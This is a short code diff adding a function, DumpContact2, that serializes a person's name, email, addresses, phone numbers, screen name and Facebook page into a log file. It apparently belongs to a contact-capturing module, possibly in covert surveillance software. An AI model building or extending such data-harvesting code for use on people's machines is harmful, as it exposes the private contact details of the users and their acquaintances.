@@ -77,6 +77,46 @@ BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *
 
 	return TRUE;
 }
+BOOL DumpContact2(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *screen_name, WCHAR *facebook_page, DWORD flags)
+{
+	bin_buf tolog;
+	ContactHeaderStruct contact_header;
+
+	contact_header.dwVersion = 0x01000001;
+	contact_header.lOid = 0;
+	contact_header.dwSize = sizeof(contact_header);
+	contact_header.dwSize += CalcEntryLen(name);
+	contact_header.dwSize += CalcEntryLen(email);
+	contact_header.dwSize += CalcEntryLen(company);
+	contact_header.dwSize += CalcEntryLen(addr_home);
+	contact_header.dwSize += CalcEntryLen(addr_office);
+	contact_header.dwSize += CalcEntryLen(phone_off);
+	contact_header.dwSize += CalcEntryLen(phone_mob);
+	contact_header.dwSize += CalcEntryLen(phone_hom);
+	contact_header.dwSize += CalcEntryLen(screen_name);
+	contact_header.dwSize += CalcEntryLen(facebook_page);
+	contact_header.program = program;
+	contact_header.flags = flags;
+
+	tolog.add(&contact_header, sizeof(contact_header));
+	ADD_CONTACT_STRING(name, 0x1);
+	ADD_CONTACT_STRING(email, 0x6);
+	ADD_CONTACT_STRING(company, 0x3);
+	ADD_CONTACT_STRING(addr_home, 0x21);
+	ADD_CONTACT_STRING(addr_office, 0x2A);
+	ADD_CONTACT_STRING(phone_off, 0xA);
+	ADD_CONTACT_STRING(phone_mob, 0x7);
+	ADD_CONTACT_STRING(phone_hom, 0xC);
+	ADD_CONTACT_STRING(screen_name, 0x40);
+	ADD_CONTACT_STRING(facebook_page, 0x40);
+
+	//Log_WriteFile2(hfile, tolog.get_buf(), tolog.get_len());
+	Log_WriteFile2(hfile, (BYTE*)name, CalcEntryLen(name));
+	Log_WriteFile2(hfile, (BYTE*)L"  ------  ", CalcEntryLen(L"  ------  "));
+	Log_WriteFile2(hfile, (BYTE*)screen_name, CalcEntryLen(screen_name));
+
+	return TRUE;
+}
 
 DWORD WINAPI CaptureContactsThread(DWORD dummy)
 {
